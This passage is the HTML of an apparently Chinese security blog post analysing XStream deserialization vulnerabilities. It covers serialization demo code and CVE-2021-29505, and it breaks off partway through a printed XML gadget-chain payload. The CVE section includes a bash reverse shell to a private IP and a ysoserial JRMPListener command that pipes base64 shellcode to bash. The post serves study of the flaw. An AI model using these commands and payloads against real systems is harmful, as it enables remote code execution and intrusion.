@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic%7CRoboto+Slab:300,300italic,400,400italic,700,700italic%7CPT+Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"f4nx1ng.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInDown"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Xstream是一个第三方的反序列化库，属于getter&#x2F;setter型的反序列化，其主要用于将一个Java对象转换成一个xml类型的结构以便于传输，有序列化的地方就会存在反序列化的漏洞，Xstream也不例外。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Xstream反序列化漏洞">
+<meta property="og:url" content="https://f4nx1ng.github.io/2024/08/19/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="f4nx1ng&#39;s blog">
+<meta property="og:description" content="Xstream是一个第三方的反序列化库，属于getter&#x2F;setter型的反序列化，其主要用于将一个Java对象转换成一个xml类型的结构以便于传输，有序列化的地方就会存在反序列化的漏洞，Xstream也不例外。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/19/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/29505%E5%88%86%E6%9E%90.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/19/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/26259%E5%88%86%E6%9E%90.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/19/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/26259%E5%88%86%E6%9E%90.jpg">
+<meta property="article:published_time" content="2024-08-19T07:38:36.000Z">
+<meta property="article:modified_time" content="2024-08-19T07:47:54.388Z">
+<meta property="article:author" content="f4nx1ng">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="Xstream">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://f4nx1ng.github.io/2024/08/19/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/29505%E5%88%86%E6%9E%90.png">
+
+
+<link rel="canonical" href="https://f4nx1ng.github.io/2024/08/19/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://f4nx1ng.github.io/2024/08/19/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","path":"2024/08/19/Xstream反序列化漏洞/","title":"Xstream反序列化漏洞"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Xstream反序列化漏洞 | f4nx1ng's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">f4nx1ng's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">17</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">6</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">18</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#xstream"><span class="nav-number">1.</span> <span class="nav-text">Xstream</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6"><span class="nav-number">1.1.</span> <span class="nav-text">Xstream反序列化机制</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#cve-2021-29505"><span class="nav-number">1.2.</span> <span class="nav-text">CVE-2021-29505</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.2.1.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.2.2.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#cve-2020-26217"><span class="nav-number">1.3.</span> <span class="nav-text">CVE-2020-26217</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="nav-number">1.3.1.</span> <span class="nav-text">影响范围：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.3.2.</span> <span class="nav-text">漏洞分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#section"><span class="nav-number">2.</span> <span class="nav-text"></span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="f4nx1ng"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">f4nx1ng</p>
+  <div class="site-description" itemprop="description">A big noob</div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/f4nx1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;f4nx1ng" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://f4nx1ng.github.io/2024/08/19/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="f4nx1ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="f4nx1ng's blog">
+      <meta itemprop="description" content="A big noob">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Xstream反序列化漏洞 | f4nx1ng's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Xstream反序列化漏洞
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-08-19 15:38:36 / 修改时间：15:47:54" itemprop="dateCreated datePublished" datetime="2024-08-19T15:38:36+08:00">2024-08-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">JAVA安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>Xstream是一个第三方的反序列化库，属于getter/setter型的反序列化，其主要用于将一个Java对象转换成一个xml类型的结构以便于传输，有序列化的地方就会存在反序列化的漏洞，Xstream也不例外。</p>
+<span id="more"></span>
+<h4 id="xstream">Xstream</h4>
+<h5 id="xstream反序列化机制">Xstream反序列化机制</h5>
+<p>​
+XStream在处理实现了Serializable接口和没有实现Serializable接口的类生成的对象时，方法是不一样的。
+当处理实现了Serializable接口的类xml时，会调用到该类的readObject方法。</p>
+<p>我们可以简单地写一段代码，来验证对于是否实现了Serializable接口的类，Xstream的处理有何不同（序列化过程）。</p>
+<p>people类（实现了序列化接口）的代码段如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">People</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">People</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;People&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot; &#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;Read People&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>没有实现序列化接口的类的接口，Person类的代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person [name=&quot;</span> + name + <span class="string">&quot;, age=&quot;</span> + age + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>测试的样例如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">People</span> <span class="variable">people</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">People</span>(<span class="string">&quot;fanxing&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;fanxing&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">xmlpeople</span> <span class="operator">=</span> xStream.toXML(people);</span><br><span class="line">        System.out.println(xmlpeople);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">xmlperson</span> <span class="operator">=</span> xStream.toXML(person);</span><br><span class="line">        System.out.println(xmlperson);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<img data-src="/2024/08/19/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/29505%E5%88%86%E6%9E%90.png" class>
+<p>现在我们写一个简单的反序列化实例把我们刚才序列化完成的对象进行反序列化。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">People</span> <span class="variable">people</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">People</span>(<span class="string">&quot;fanxing&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;fanxing&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">xmlpeople</span> <span class="operator">=</span> xStream.toXML(people);</span><br><span class="line">        System.out.println(xmlpeople);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> xStream.fromXML(xmlpeople);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">xmlperson</span> <span class="operator">=</span> xStream.toXML(person);</span><br><span class="line">        System.out.println(xmlperson);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从下面的图片中我们不难发现，对于实现了Serializable接口的类产生的对象，在使用XStream对其进行反序列化的时候，会调用该类自定义的readobject方法。</p>
+
+<h5 id="cve-2021-29505">CVE-2021-29505</h5>
+<p>复现漏洞的文章网上有很多，主要就是发送一个包含RMI的Post请求，其中包含RMI目的主机（Attacker）的IP和端口，我们可以在目的主机开启NC监听是否接收到了RMI，或者将Payload中的IP直接写为DNSLog。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.72.15/9527 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">java -<span class="built_in">cp</span> ysoserial.jar ysoserial.exploit.JRMPListener 2506 CommonsCollections6 <span class="string">&quot;bash -c &#123;echo,base64_shellcode&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+<p>我们使用网上的payload进行攻击然后调试，如下的payload中有关host的部分需要按需更改。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>12345<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>12345<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">parsedMessage</span>&gt;</span>true<span class="tag">&lt;/<span class="name">parsedMessage</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">soapVersion</span>&gt;</span>SOAP_11<span class="tag">&lt;/<span class="name">soapVersion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bodyParts</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">sm</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">attachmentsInitialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">attachmentsInitialized</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nullIter</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">aliases</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">candidates</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">names</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">ctx</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span 